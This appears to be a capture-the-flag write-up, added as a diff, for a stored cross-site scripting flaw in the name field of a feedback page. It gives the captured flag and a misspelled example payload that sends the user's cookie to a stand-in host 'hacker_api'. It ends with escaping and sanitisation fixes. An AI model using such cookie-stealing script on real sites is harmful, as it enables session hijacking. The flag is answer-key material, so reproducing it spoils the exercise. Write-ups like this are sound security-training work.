@@ -1,0 +1,23 @@
+On the page http://IP/?page=feedback
+
+Enter *script* in the name input
+
+flag : 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E
+
+Cross Site Scripting (XSS) explination:
+all good hackings start with analyses basically see how the application works, if you put html code in the input "<b>test</b>" and fill the message after  
+you going to realize that input name allow the html
+
+for example the hacker can write javascript code in the input like :
+<script>document.write('</img src="https://hacker_api?coockie">'+document.coockie>....)</script>
+the hacker can track the user commection to the server and use the coockie on his side to connect to the server 
+
+youtube.com/watch?v=cbmBDiR6WaY
+
+solution : 
+
+never insert untrusted data except in allowed locations
+HTML escape before inserting untrusted data into HTML element content
+attribute escape before inserting untrusted data into HTML common attributes
+javascript escape before inserting untrusted data into javascript data values
+- sanitize-html
